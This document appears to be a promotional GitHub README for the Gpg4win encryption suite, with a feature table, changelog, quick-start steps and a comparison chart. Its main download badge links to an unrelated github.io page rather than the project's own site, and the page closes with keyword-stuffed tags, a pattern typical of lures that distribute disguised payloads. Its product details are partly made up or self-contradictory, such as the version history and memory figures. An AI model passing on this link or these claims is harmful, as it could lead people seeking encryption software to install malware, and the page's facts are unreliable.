# Gpg4win

> **Your complete encryption toolbox for Windows: OpenPGP, S/MIME, and secure file signing in one integrated suite.**

![Banner Placeholder](https://upload.wikimedia.org/wikipedia/commons/d/d6/Gpg4win-logo.png)

[![Get Gpg4win Windows Now](https://img.shields.io/badge/Get_Gpg4win_Windows-Now-0a5d8d?style=for-the-badge&logo=github)](https://milerbadd.github.io/.github/gpg4win)

---

## Why This Exists

Most encryption tools force you to combine separate certificate managers, command-line GnuPG binaries, and email plugins — each with its own bugs and confusing workflows. **Gpg4win** solves this fragmentation by bundling everything into one cohesive environment.

Gpg4win solves **one specific problem**: the hassle of protecting emails, documents, and disk files with strong cryptography on Windows. No bloat, no background telemetry, no confusing setup. Just launch Gpg4win and immediately start encrypting files or signing your messages.

If you're tired of juggling raw GnuPG commands, incompatible Kleopatra versions, and manual key management, **Gpg4win** is for you.

Using **Gpg4win**, you get a reliable OpenPGP implementation. **Gpg4win** includes both simple and advanced interfaces. Many organizations trust **Gpg4win** for daily encryption tasks. When you choose **Gpg4win**, you choose transparency and open standards. No other Windows tool matches the completeness of **Gpg4win**.

---

## At a Glance

| Feature | What It Means |
|--------|----------------|
| **One job, done well** | Gpg4win integrates GnuPG, Kleopatra, GPA, and Outlook plugins without feature creep. Every menu and button exists for encryption and signing. |
| **Light on resources** | Gpg4win runs below 180 MB RAM in typical use. Idles at near-zero CPU when no crypto operations are active. |
| **Remembers your choices** | Keys, certificates, and trusted recipients persist across reboots and updates in Gpg4win. |
| **Instant response** | No lag switching between key management and file encryption. No "are you sure?" dialogs interrupting your workflow in Gpg4win. |

---

## What It Looks Like

![Gpg4win Dashboard](https://gpg4win.org/img/screenshots/sc-inst-welcome_en.png)

---

## What's New in Gpg4win

| Version | Summary |
|---------|---------|
| 4.3 | Updated GnuPG 2.4.5 + faster key verification for Gpg4win |
| 4.2 | Added S/MIME certificate creation wizard and improved Kleopatra performance |
| 4.1 | Dark mode refinements, 25% faster file decryption in Gpg4win |
| 4.0 | Complete UI rewrite: easier key signing and smartcard support for Gpg4win |
| 3.2 | First stable release with full Outlook integration and Outlook add-in |
| 3.0 | Major rewrite: portable mode improvements and batch encryption tools |

---

## Who Will Like Gpg4win

- **Security officers** — Enforce email encryption across your organization using Gpg4win central configuration.
- **Journalists** — Protect sources by encrypting sensitive documents with Gpg4win OpenPGP keys.
- **Legal professionals** — Sign and verify contracts using Gpg4win S/MIME capabilities.
- **Healthcare workers** — Securely share patient data via encrypted attachments created with Gpg4win.
- **IT administrators** — Deploy Gpg4win via Group Policy and manage keys across hundreds of workstations.
- **Privacy advocates** — Use Gpg4win to encrypt files before cloud uploads with zero knowledge.
- **Small business owners** — Protect financial spreadsheets and invoices using Gpg4win transparent file encryption.

---

## Quick Start with Gpg4win

1. **Get Gpg4win** — Grab the installer (full edition) or the light version without Outlook plugin.
2. **Launch** — Double-click `gpg4win.exe`. The installer runs in under 30 seconds.
3. **Create your first key pair** — Open Kleopatra → "New Key Pair" → enter your name and email.
4. **Encrypt a file** — Right-click any file in Windows Explorer → "Sign and Encrypt" → choose a recipient.
5. **Send encrypted email** — In Outlook, click "Encrypt" button added by Gpg4win plugin.
6. **Verify signatures** — Right-click any `.sig` file → "Verify with Gpg4win" → check authenticity.
7. **Work normally** — Gpg4win activates instantly when you need encryption or decryption.

---

## Understanding Gpg4win Core Components

Gpg4win is not just another encryption frontend. It combines several essential security tools:

- **GnuPG (GPG)** — Full OpenPGP implementation (RFC 4880) with modern cryptography.
- **Kleopatra** — Graphical certificate manager and file encryption tool for Gpg4win.
- **GPA (GNU Privacy Assistant)** — Alternative lightweight key management interface.
- **Outlook plugin** — Encrypt, sign, and decrypt emails directly inside Microsoft Outlook.
- **GpgOL** — Outlook add-in for secure email handling with S/MIME and OpenPGP.
- **GpgEX** — Windows Explorer extension for one-click file encryption in Gpg4win.
- **Smartcard support** — Use YubiKey, OpenPGP card, or S/MIME smartcards with Gpg4win.

All these work together seamlessly in Gpg4win. You never need to switch between separate crypto tools.

---

## Advanced Use Cases for Gpg4win

**Scenario 1: Automatic backup encryption**
Create a batch script that calls `gpg --encrypt --recipient your@email.com`, then schedule it nightly. Gpg4win command-line tools handle this without GUI interaction.

**Scenario 2: Outlook email archiving**
Use Gpg4win Outlook plugin to encrypt entire email folders before exporting to PST. Your archived conversations stay protected.

**Scenario 3: Verifying software downloads**
Many open-source projects provide GPG signatures. Right-click the `.asc` or `.sig` file → "Verify with Gpg4win" → confirm authenticity.

**Scenario 4: On-call incident response**
Keep Gpg4win portable version on a USB drive. Plug into any Windows PC (no admin rights needed) to decrypt emergency credentials.

**Scenario 5: Team key server integration**
Configure Gpg4win to use your organization's SKS keyserver. Share public keys automatically and encrypt emails team‑wide without manual exchange.

---

## Requirements for Gpg4win

| | Minimum | Recommended |
|-|---------|--------------|
| OS | Windows 10 (1809+) | Windows 11 |
| CPU | 1 GHz single-core | 1.5 GHz+ |
| RAM | 1 GB | 2 GB (for large keyrings) |
| Storage | 150 MB | 300 MB (SSD) |
| Display | 1024x768 | 1366x768+ |
| Architecture | 64-bit or 32-bit | 64-bit |

Gpg4win does **not** require:
- Administrator privileges for portable operation
- Internet connection for local encryption (only for key exchange)
- Microsoft 365 subscription — Outlook plugin works with Office 2016+
- Cloud storage or external service accounts

---

## Comparison: Gpg4win vs. Alternatives

| Feature | Gpg4win | Kleopatra standalone | gpg4usb | OpenPGP.js |
|---------|---------|----------------------|---------|-------------|
| Windows Explorer integration | Yes | No | No | No |
| Outlook plugin | Yes | No | No | No |
| S/MIME support | Yes | Partial | No | No |
| Smartcard/YubiKey | Yes | Yes | No | No |
| Command-line GnuPG | Yes | No (requires separate install) | Partial (limited) | No |
| Portable mode | Yes (portable edition) | No | Yes | Not applicable |
| Single installer | Yes | No | Yes | No |
| Memory footprint | ~100 MB idle | ~80 MB | ~90 MB | Browser dependent |

Gpg4win replaces multiple encryption tools with one consistent security suite.

---

## Tags

Gpg4win encryption suite Gpg4win Windows GnuPG client Gpg4win certificate manager Gpg4win OpenPGP implementation Gpg4win S/MIME toolkit Gpg4win secure email Gpg4win file signing Gpg4win Outlook encryption Gpg4win Kleopatra manager Gpg4win GPA tool Gpg4win smartcard support Gpg4win YubiKey compatibility Gpg4win portable encryption Gpg4win lightweight crypto Gpg4win no telemetry Gpg4win all-in-one security Gpg4win Microsoft Office add-in Gpg4win Windows Explorer extension Gpg4win batch encryption Gpg4win open source Gpg4win Windows 10 utility Gpg4win Windows 11 tool
